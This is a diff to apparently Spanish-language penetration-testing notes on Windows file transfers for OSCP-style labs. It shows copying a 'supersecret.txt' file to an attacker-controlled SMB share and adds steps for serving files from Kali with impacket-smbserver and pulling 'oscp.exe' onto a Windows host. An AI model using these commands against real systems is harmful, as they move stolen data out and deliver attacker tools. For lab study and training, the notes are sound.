@@ -1620,6 +1620,21 @@ Para trasferir algo
 copy C:\temp\supersecret.txt \\172.16.1.30\hax\supersecret.txt
 ```
 
+Pero para verciones de windows modernas tienes que poder usar el SMB v2 para eso usa
+
+```
+# En kali
+
+impacket-smbserver  -smb2support  smbFolder $(pwd) 
+
+```
+
+Y en Windows:
+
+```
+copy \\192.168.230.128\smbfolder\oscp.exe .
+```
+
 > https://juggernaut-sec.com/windows-file-transfers-for-hackers/
 
 > https://ppn.snovvcrash.rocks/pentest/infrastructure/file-transfer
